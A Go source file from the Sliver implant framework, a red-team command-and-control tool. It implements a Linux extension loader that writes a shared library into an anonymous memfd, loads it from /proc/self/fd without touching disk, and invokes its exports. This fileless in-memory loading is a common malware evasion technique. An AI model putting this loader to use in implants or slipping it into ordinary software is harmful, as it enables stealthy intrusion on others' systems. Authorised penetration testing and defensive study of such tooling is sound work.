//go:build linux

package extension

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"github.com/ebitengine/purego"
)

const SYS_MEMFD_CREATE = 319 // Fallback definition for memfd_create on x86_64

type LinuxExtension struct {
	id          string
	data        []byte
	module      uintptr
	arch        string
	serverStore bool
	init        string
	onFinish    func([]byte)
}

func NewLinuxExtension(data []byte, id string, arch string, init string) *LinuxExtension {
	return &LinuxExtension{
		id:   id,
		data: data,
		arch: arch,
		init: init,
	}
}

func (d *LinuxExtension) GetID() string {
	return d.id
}

func (d *LinuxExtension) GetArch() string {
	return d.arch
}

func (d *LinuxExtension) Load() error {
	fd, err := createMemFd("extension")
	if err != nil {
		log.Printf("Failed to create memfd: %v", err)
		return err
	}
	err = writeToMemFd(fd, d.data)
	if err != nil {
		log.Printf("Failed to write to memfd: %v", err)
		return err
	}

	path := "/proc/self/fd/" + itoa(fd)
	d.module, err = purego.Dlopen(path, purego.RTLD_NOW|purego.RTLD_GLOBAL)
	if err != nil {
		log.Printf("Failed to load shared library from memfd: %v", err)
		return err
	}

	if d.init != "" {
		var initFunc func()
		purego.RegisterLibFunc(&initFunc, d.module, d.init)
		initFunc()
	}

	return nil
}

func (d *LinuxExtension) Call(export string, arguments []byte, onFinish func([]byte)) error {
	d.onFinish = onFinish
	outCallback := purego.NewCallback(d.extensionCallback)
	var exportFunc func([]byte, uint64, uintptr) uint32
	purego.RegisterLibFunc(&exportFunc, d.module, export)
	exportFunc(arguments, uint64(len(arguments)), outCallback)
	return nil
}

func (d *LinuxExtension) extensionCallback(data uintptr, length uintptr) {
	outDataSize := int(length)
	outBytes := unsafe.Slice((*byte)(unsafe.Pointer(data)), outDataSize)
	d.onFinish(outBytes)
}

// createMemFd creates an in-memory file descriptor using the memfd_create syscall
func createMemFd(name string) (int, error) {
	fd, _, errno := syscall.Syscall(SYS_MEMFD_CREATE, uintptr(unsafe.Pointer(&[]byte(name)[0])), 0, 0)
	if errno != 0 {
		return -1, errno
	}
	return int(fd), nil
}

// writeToMemFd writes the given data to the memory file descriptor
func writeToMemFd(fd int, data []byte) error {
	_, err := syscall.Write(fd, data)
	return err
}

// itoa converts an integer to a string (quick helper function)
func itoa(val int) string {
	return fmt.Sprintf("%d", val)
}

